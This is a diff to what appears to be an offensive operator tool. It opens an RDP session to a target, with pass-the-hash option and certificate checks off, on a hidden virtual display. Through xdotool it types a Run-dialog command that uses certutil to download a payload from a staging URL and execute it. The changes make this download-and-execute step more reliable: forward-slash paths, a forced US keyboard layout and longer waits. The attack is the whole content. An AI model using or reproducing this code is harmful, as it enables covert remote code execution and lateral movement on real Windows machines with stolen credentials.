@@ -17194,17 +17194,20 @@ async function ipcRun(action) {
       // so the RDP window never appears on the operator's real screen.
       // xclip writes to the virtual display clipboard; xdotool targets the same display.
       if (!surl) { toast('Enter Staging URL', 'error'); return; }
-      // winCmd is typed directly via xdotool — no clipboard sync dependency.
-      // Backslashes in rpath become \\ in the bash double-quoted arg, which bash
-      // normalises back to \ before xdotool receives the string.
-      const winCmd   = `cmd /c certutil -urlcache -split -f ${surl} ${rpath} && ${rpath}`;
+      // Use forward slashes in the path so xdotool never has to type '\' —
+      // Windows cmd.exe and certutil both accept '/' as a path separator.
+      // This avoids xfreerdp keyboard-layout mismatches (e.g. Spanish layout
+      // where the backslash key position differs from US).
+      const rpFwd  = rpath.replace(/\\/g, '/');
+      const winCmd = `cmd /c certutil -urlcache -split -f ${surl} ${rpFwd} && ${rpFwd}`;
       // Use double-quoted xfreerdp args — safe inside bash -c '...' (only single quotes break it)
       const uDQ = (a.user   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const pDQ = (a.pass   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const dDQ = (a.domain ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const rdpDomDQ   = dDQ ? ` /d:"${dDQ}"` : '';
       const rdpCredsDQ = usePTH ? `/pth:${ntHash} /restricted-admin` : `/p:"${pDQ}"`;
-      const xfreeCmd   = `xfreerdp /v:${a.target}${rdpDomDQ} /u:"${uDQ}" ${rdpCredsDQ} /cert:ignore /w:800 /h:600 /log-level:OFF`;
+      // /kbd:0x0409 forces US English layout so key positions are predictable
+      const xfreeCmd   = `xfreerdp /v:${a.target}${rdpDomDQ} /u:"${uDQ}" ${rdpCredsDQ} /cert:ignore /kbd:0x0409 /w:800 /h:600 /log-level:OFF`;
       // Wrapped in bash -c '...' — content must contain no literal single quotes.
       // xdotool type sends key events directly through xfreerdp → avoids the async
       // RDP clipboard-sync race that caused xclip+ctrl+v to paste stale content.
@@ -17224,7 +17227,7 @@ async function ipcRun(action) {
         `DISPLAY="$VDISP" xdotool key --window "$WID" Escape`,
         `sleep 0.5`,
         `DISPLAY="$VDISP" xdotool key --window "$WID" super+r`,
-        `sleep 2`,
+        `sleep 3`,
         `DISPLAY="$VDISP" xdotool type --clearmodifiers --delay 20 --window "$WID" "${winCmd}"`,
         `sleep 0.5`,
         `DISPLAY="$VDISP" xdotool key --window "$WID" Return`,
